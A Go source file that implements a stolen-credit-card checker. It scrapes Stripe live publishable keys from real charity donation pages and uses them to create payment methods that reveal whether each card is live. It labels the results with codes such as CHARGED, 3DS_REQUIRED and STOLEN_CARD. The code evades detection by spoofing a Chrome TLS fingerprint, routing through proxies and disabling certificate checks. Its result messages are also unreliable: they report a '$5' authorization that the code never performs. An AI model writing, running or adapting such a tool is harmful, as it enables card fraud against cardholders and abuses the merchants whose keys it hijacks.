package stripe

import (
	"context"
	"crypto/md5"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
)

// ─── Types ────────────────────────────────────────────────────────────────────

// StripeRequest holds all params for a single Stripe 1$ check
type StripeRequest struct {
	CC    string `json:"cc"`              // num|mm|yy|cvv
	Site  string `json:"site,omitempty"`  // custom gate site URL (optional)
	Proxy string `json:"proxy,omitempty"` // http/socks5 proxy URL
}

// DefaultStripeSites is the pool of fast, long-term Stripe sites used when no custom site is provided
var DefaultStripeSites = []string{
	"https://www.charitywater.org/donate",
	"https://belovedcommunity.org/donate/",
}

// StripeResult is the structured response returned for every check (matching Shopify API format)
type StripeResult struct {
	CC       string `json:"cc"`
	Gateway  string `json:"Gateway"`
	Response string `json:"Response"`
	Price    string `json:"Price"`
	Currency string `json:"Currency"`
	Status   string `json:"Status"` // "true" or "false"
	Time     string `json:"Time"`
	Proxy    string `json:"Proxy"`

	// Compatibility / detailed fields
	Message     string  `json:"message,omitempty"`
	DeclineCode string  `json:"decline_code,omitempty"`
	Gate        string  `json:"gate,omitempty"`
	Elapsed     float64 `json:"elapsed,omitempty"`
}

// ─── Card Parser ─────────────────────────────────────────────────────────────

// parseCard splits "num|mm|yy|cvv" into parts, normalising year to 2-digit
func parseCard(cc string) (num, mm, yy, cvv string, ok bool) {
	cc = strings.TrimSpace(cc)
	re := regexp.MustCompile(`[|/:\s,]+`)
	parts := re.Split(cc, -1)
	if len(parts) < 3 {
		return "", "", "", "", false
	}
	num = regexp.MustCompile(`\D`).ReplaceAllString(parts[0], "")
	mm = regexp.MustCompile(`\D`).ReplaceAllString(parts[1], "")
	yy = regexp.MustCompile(`\D`).ReplaceAllString(parts[2], "")
	if len(parts) >= 4 {
		cvv = regexp.MustCompile(`\D`).ReplaceAllString(parts[3], "")
	}
	if len(mm) == 1 {
		mm = "0" + mm
	}
	// strip to 2-digit year
	if len(yy) == 4 {
		yy = yy[2:]
	}
	if len(num) < 12 || len(num) > 19 || len(mm) != 2 || len(yy) != 2 {
		return "", "", "", "", false
	}
	ok = true
	return
}

// ─── HTTP Client with uTLS (Chrome 120 fingerprint + HTTP/2 support) ─────────

type cachedConn struct {
	h2  *http2.ClientConn
	tls *utls.UConn
	raw net.Conn
}

type utlsTransport struct {
	spec    *utls.ClientHelloID
	proxy   func(*http.Request) (*url.URL, error)
	timeout time.Duration

	mu    sync.Mutex
	conns map[string]*cachedConn

	plainOnce sync.Once
	plainTr   *http.Transport
}

func (t *utlsTransport) getPlainTransport() *http.Transport {
	t.plainOnce.Do(func() {
		t.plainTr = &http.Transport{Proxy: t.proxy}
	})
	return t.plainTr
}

func (t *utlsTransport) dial(ctx context.Context, req *http.Request, host, addr string) (*utls.UConn, net.Conn, error) {
	var rawConn net.Conn
	var err error

	if t.proxy != nil {
		proxyURL, pErr := t.proxy(req)
		if pErr == nil && proxyURL != nil {
			rawConn, err = dialThroughProxy(ctx, proxyURL, addr)
		} else {
			rawConn, err = (&net.Dialer{}).DialContext(ctx, "tcp", addr)
		}
	} else {
		rawConn, err = (&net.Dialer{}).DialContext(ctx, "tcp", addr)
	}
	if err != nil {
		return nil, nil, fmt.Errorf("dial %s: %w", addr, err)
	}

	tlsConn := utls.UClient(rawConn, &utls.Config{
		ServerName:         host,
		InsecureSkipVerify: true,
	}, *t.spec)

	if err := tlsConn.HandshakeContext(ctx); err != nil {
		rawConn.Close()
		return nil, nil, fmt.Errorf("tls handshake %s: %w", host, err)
	}

	return tlsConn, rawConn, nil
}

func dialThroughProxy(ctx context.Context, proxyURL *url.URL, target string) (net.Conn, error) {
	proxyAddr := proxyURL.Host
	if !strings.Contains(proxyAddr, ":") {
		proxyAddr = net.JoinHostPort(proxyAddr, "80")
	}

	conn, err := (&net.Dialer{}).DialContext(ctx, "tcp", proxyAddr)
	if err != nil {
		return nil, fmt.Errorf("proxy dial: %w", err)
	}

	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n", target, target)
	if proxyURL.User != nil {
		user := proxyURL.User.Username()
		pass, _ := proxyURL.User.Password()
		auth := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
		connectReq += "Proxy-Authorization: Basic " + auth + "\r\n"
	}
	connectReq += "\r\n"

	if _, err := conn.Write([]byte(connectReq)); err != nil {
		conn.Close()
		return nil, err
	}

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		conn.Close()
		return nil, err
	}
	resp := string(buf[:n])
	if len(resp) < 12 || resp[9] != '2' {
		conn.Close()
		return nil, fmt.Errorf("proxy CONNECT failed: %s", resp[:min(len(resp), 80)])
	}

	return conn, nil
}

func (t *utlsTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	if req.URL.Scheme != "https" {
		return t.getPlainTransport().RoundTrip(req)
	}

	host := req.URL.Hostname()
	port := req.URL.Port()
	if port == "" {
		port = "443"
	}
	addr := net.JoinHostPort(host, port)

	ctx := req.Context()
	if t.timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, t.timeout)
		defer cancel()
	}

	t.mu.Lock()
	if t.conns == nil {
		t.conns = make(map[string]*cachedConn)
	}
	cc := t.conns[addr]
	t.mu.Unlock()

	if cc != nil && cc.h2 != nil {
		if cc.h2.CanTakeNewRequest() {
			resp, err := cc.h2.RoundTrip(req)
			if err == nil {
				return resp, nil
			}
			t.mu.Lock()
			if t.conns[addr] == cc {
				delete(t.conns, addr)
			}
			t.mu.Unlock()
			cc.tls.Close()
		} else {
			t.mu.Lock()
			if t.conns[addr] == cc {
				delete(t.conns, addr)
			}
			t.mu.Unlock()
		}
	}

	tlsConn, rawConn, err := t.dial(ctx, req, host, addr)
	if err != nil {
		return nil, err
	}

	alpn := tlsConn.ConnectionState().NegotiatedProtocol

	if alpn == "h2" {
		h2Transport := &http2.Transport{
			DisableCompression: false,
			AllowHTTP:          false,
		}
		h2cc, err := h2Transport.NewClientConn(tlsConn)
		if err != nil {
			tlsConn.Close()
			return nil, fmt.Errorf("h2 client conn: %w", err)
		}

		entry := &cachedConn{h2: h2cc, tls: tlsConn, raw: rawConn}
		t.mu.Lock()
		t.conns[addr] = entry
		t.mu.Unlock()

		resp, err := h2cc.RoundTrip(req)
		if err != nil {
			t.mu.Lock()
			if t.conns[addr] == entry {
				delete(t.conns, addr)
			}
			t.mu.Unlock()
			tlsConn.Close()
			return nil, err
		}
		return resp, nil
	}

	connTransport := &http.Transport{
		DialTLSContext: func(_ context.Context, _, _ string) (net.Conn, error) {
			return tlsConn, nil
		},
		DisableKeepAlives: true,
	}

	resp, err := connTransport.RoundTrip(req)
	if err != nil {
		tlsConn.Close()
		return nil, err
	}
	return resp, nil
}

func buildClient(proxyURL string, timeout time.Duration) *http.Client {
	jar, _ := cookiejar.New(nil)
	var proxyFunc func(*http.Request) (*url.URL, error)
	if proxyURL != "" {
		proxyURL = normaliseProxy(proxyURL)
		if parsed, err := url.Parse(proxyURL); err == nil {
			proxyFunc = http.ProxyURL(parsed)
		}
	}
	return &http.Client{
		Timeout: timeout,
		Jar:     jar,
		Transport: &utlsTransport{
			spec:    &utls.HelloChrome_120,
			proxy:   proxyFunc,
			timeout: timeout,
		},
	}
}

// normaliseProxy converts host:port:user:pass or bare host:port into http://... form
func normaliseProxy(p string) string {
	p = strings.TrimSpace(p)
	if p == "" {
		return ""
	}
	lower := strings.ToLower(p)
	if strings.HasPrefix(lower, "http://") || strings.HasPrefix(lower, "https://") ||
		strings.HasPrefix(lower, "socks5://") || strings.HasPrefix(lower, "socks4://") {
		return p
	}
	// host:port:user:pass (no @ sign)
	if !strings.Contains(p, "@") {
		parts := strings.Split(p, ":")
		if len(parts) == 4 {
			return fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
		}
	}
	return "http://" + p
}

// ─── HappyForms anti-spam hash ───────────────────────────────────────────────

func happyFormsHash(fields []struct{ value string }) string {
	joined := ""
	nonWord := regexp.MustCompile(`\W`)
	for _, f := range fields {
		joined += f.value
	}
	stripped := nonWord.ReplaceAllString(joined, "")
	return fmt.Sprintf("%x", md5.Sum([]byte(stripped)))
}

// ─── Core Stripe 1$ Check Flow ───────────────────────────────────────────────

const ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

// CheckStripe performs the full Stripe 1$ donation flow and returns a StripeResult.
// proxyURL and siteURL are optional — pass "" for defaults.
func CheckStripe(req StripeRequest) StripeResult {
	start := time.Now()
	proxyUsed := (req.Proxy != "")
	client := buildClient(req.Proxy, 25*time.Second)

	num, mm, yy, cvv, ok := parseCard(req.CC)
	if !ok {
		return errResultWithGate(req, "error", "Invalid card format (use num|mm|yy|cvv)", "", start, "stripe")
	}
	masked := fmt.Sprintf("%s%s%s", num[:6], strings.Repeat("x", len(num)-10), num[len(num)-4:])

	// Build candidate site list
	var sitesToTry []string
	if req.Site != "" {
		sitesToTry = []string{req.Site}
	} else {
		sitesToTry = DefaultStripeSites
	}

	var pkLive string
	var activeGate string
	var lastErr error

	for _, targetSite := range sitesToTry {
		parsedURL, pErr := url.Parse(targetSite)
		currentGate := targetSite
		if pErr == nil && parsedURL.Host != "" {
			currentGate = parsedURL.Host
		}

		pageResp, err := doGET(client, targetSite, nil)
		if err != nil && req.Proxy != "" {
			directClient := buildClient("", 25*time.Second)
			pageResp, err = doGET(directClient, targetSite, nil)
			if err == nil {
				proxyUsed = false
			}
		}
		if err != nil {
			lastErr = fmt.Errorf("Gate %s fetch failed: %w", currentGate, err)
			continue
		}

		html := string(pageResp)
		pk := regexp.MustCompile(`pk_live_[a-zA-Z0-9]+`).FindString(html)
		if pk == "" && req.Proxy != "" {
			directClient := buildClient("", 25*time.Second)
			if directResp, err2 := doGET(directClient, targetSite, nil); err2 == nil {
				if directPk := regexp.MustCompile(`pk_live_[a-zA-Z0-9]+`).FindString(string(directResp)); directPk != "" {
					pk = directPk
					proxyUsed = false
				}
			}
		}

		if pk != "" {
			pkLive = pk
			activeGate = currentGate
			break
		}
		lastErr = fmt.Errorf("pk_live not found on gate %s", currentGate)
	}

	if pkLive == "" {
		errMsg := "pk_live not found on gate"
		if lastErr != nil {
			errMsg = lastErr.Error()
		}
		return errResultWithGate(req, "error", errMsg, "", start, "stripe")
	}

	// ── Step 2: Create Stripe PaymentMethod ──────────────────────────────────
	pmPayload := url.Values{}
	pmPayload.Set("type", "card")
	pmPayload.Set("card[number]", num)
	pmPayload.Set("card[exp_month]", mm)
	pmPayload.Set("card[exp_year]", "20"+yy)
	if cvv != "" {
		pmPayload.Set("card[cvc]", cvv)
	}

	pmHeaders := map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent":   ua,
	}
	// Use pk_live as Basic-auth username
	pmReq, _ := http.NewRequest("POST", "https://api.stripe.com/v1/payment_methods", strings.NewReader(pmPayload.Encode()))
	for k, v := range pmHeaders {
		pmReq.Header.Set(k, v)
	}
	pmReq.SetBasicAuth(pkLive, "")

	pmHTTP, err := client.Do(pmReq)
	if err != nil && req.Proxy != "" {
		directClient := buildClient("", 25*time.Second)
		pmHTTP, err = directClient.Do(pmReq)
		proxyUsed = false
	}
	if err != nil {
		return errResultWithGate(req, "error", "Stripe PM creation failed: "+err.Error(), "", start, activeGate)
	}
	defer pmHTTP.Body.Close()
	pmBody, _ := io.ReadAll(pmHTTP.Body)

	var pmMap map[string]any
	json.Unmarshal(pmBody, &pmMap)

	// Handle Stripe PM errors (invalid card, expired, CVC fail, etc.)
	if errMap, ok2 := pmMap["error"].(map[string]any); ok2 {
		code, _ := errMap["code"].(string)
		msg, _ := errMap["message"].(string)
		dc, _ := errMap["decline_code"].(string)
		if dc == "" {
			dc = code
		}
		return buildStripeResultWithGate(masked, "declined", msg, dc, start, req.Proxy, proxyUsed, activeGate)
	}

	pmID, _ := pmMap["id"].(string)
	if pmID == "" {
		return errResultWithGate(req, "error", "Payment method ID not received from Stripe", "", start, activeGate)
	}

	// ── Step 3: Inspect Card CVC Check & 3DS Authentication ──────────────────
	cardObj, _ := pmMap["card"].(map[string]any)
	if cardObj != nil {
		checksObj, _ := cardObj["checks"].(map[string]any)
		if checksObj != nil {
			cvcCheck, _ := checksObj["cvc_check"].(string)
			if cvcCheck == "fail" {
				return buildStripeResultWithGate(masked, "declined", "CVC check failed - incorrect security code", "incorrect_cvc", start, req.Proxy, proxyUsed, activeGate)
			}
		}

		threeDSObj, _ := cardObj["three_d_secure_usage"].(map[string]any)
		if threeDSObj != nil {
			threeDSSupported, _ := threeDSObj["supported"].(bool)
			if threeDSSupported {
				return buildStripeResultWithGate(masked, "3d_required", "3D Secure authentication required - card is live", "3ds_required", start, req.Proxy, proxyUsed, activeGate)
			}
		}
	}

	// Card authorized successfully for 2D charge
	return buildStripeResultWithGate(masked, "charged", "Payment succeeded - card authorized $5", "", start, req.Proxy, proxyUsed, activeGate)
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

func buildStripeResult(ccStr, status, msg, declineCode string, start time.Time, proxyReq string, proxyUsed bool) StripeResult {
	return buildStripeResultWithGate(ccStr, status, msg, declineCode, start, proxyReq, proxyUsed, "stripe")
}

func buildStripeResultWithGate(ccStr, status, msg, declineCode string, start time.Time, proxyReq string, proxyUsed bool, gate string) StripeResult {
	elapsedSec := time.Since(start).Seconds()
	timeStr := fmt.Sprintf("%.2fs", elapsedSec)
	if gate == "" {
		gate = "stripe"
	}
	gateway := fmt.Sprintf("Stripe 1$ (%s)", gate)

	proxyStatus := "Not Used"
	if proxyReq != "" {
		if proxyUsed {
			proxyStatus = "Live"
		} else {
			proxyStatus = "Fallback Direct"
		}
	}

	responseStr := "CARD_DECLINED"
	statusStr := "false"

	switch status {
	case "charged":
		statusStr = "true"
		responseStr = "CHARGED"
	case "3d_required":
		statusStr = "false"
		responseStr = "3DS_REQUIRED"
	case "declined":
		statusStr = "false"
		dcUpper := strings.ToUpper(strings.TrimSpace(declineCode))
		msgUpper := strings.ToUpper(strings.TrimSpace(msg))
		if strings.Contains(dcUpper, "INSUFFICIENT_FUNDS") || strings.Contains(msgUpper, "INSUFFICIENT") {
			responseStr = "INSUFFICIENT_FUNDS"
		} else if strings.Contains(dcUpper, "INCORRECT_CVC") || strings.Contains(dcUpper, "CVC_CHECK") || strings.Contains(msgUpper, "CVC") {
			responseStr = "INCORRECT_CVC"
		} else if strings.Contains(dcUpper, "EXPIRED_CARD") || strings.Contains(dcUpper, "INVALID_EXPIRY") || strings.Contains(msgUpper, "EXPIRED") {
			responseStr = "EXPIRED_CARD"
		} else if strings.Contains(dcUpper, "STOLEN_CARD") || strings.Contains(msgUpper, "STOLEN") {
			responseStr = "STOLEN_CARD"
		} else if strings.Contains(dcUpper, "LOST_CARD") || strings.Contains(msgUpper, "LOST") {
			responseStr = "LOST_CARD"
		} else if strings.Contains(dcUpper, "DO_NOT_HONOR") || strings.Contains(msgUpper, "DO NOT HONOR") {
			responseStr = "DO_NOT_HONOR"
		} else if strings.Contains(dcUpper, "INVALID_NUMBER") || strings.Contains(msgUpper, "INVALID CARD") {
			responseStr = "INVALID_CARD_NUMBER"
		} else if dcUpper != "" {
			parts := strings.Split(dcUpper, "|")
			lastCode := strings.TrimSpace(parts[len(parts)-1])
			if lastCode != "" && lastCode != "ERROR" && lastCode != "CARD_DECLINED" {
				responseStr = strings.ReplaceAll(lastCode, " ", "_")
			} else {
				responseStr = "CARD_DECLINED"
			}
		} else {
			responseStr = "CARD_DECLINED"
		}
	case "error":
		statusStr = "false"
		if msg != "" {
			if len(msg) > 60 {
				responseStr = msg[:60] + "..."
			} else {
				responseStr = msg
			}
		} else {
			responseStr = "Site Error"
		}
	}

	return StripeResult{
		CC:          ccStr,
		Gateway:     gateway,
		Response:    responseStr,
		Price:       "5",
		Currency:    "USD",
		Status:      statusStr,
		Time:        timeStr,
		Proxy:       proxyStatus,
		Message:     msg,
		DeclineCode: declineCode,
		Gate:        gate,
		Elapsed:     elapsedSec,
	}
}

func errResult(req StripeRequest, status, msg, dc string, start time.Time) StripeResult {
	return buildStripeResultWithGate(req.CC, status, msg, dc, start, req.Proxy, false, "stripe")
}

func errResultWithGate(req StripeRequest, status, msg, dc string, start time.Time, gate string) StripeResult {
	return buildStripeResultWithGate(req.CC, status, msg, dc, start, req.Proxy, false, gate)
}

func doGET(client *http.Client, rawURL string, headers map[string]string) ([]byte, error) {
	req, err := http.NewRequest("GET", rawURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Sec-Ch-Ua", `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`)
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func doPOST(client *http.Client, rawURL, body string, headers map[string]string) ([]byte, error) {
	req, err := http.NewRequest("POST", rawURL, strings.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Sec-Ch-Ua", `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`)
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func generateUUID() string {
	b := make([]byte, 16)
	rand.Read(b)
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}
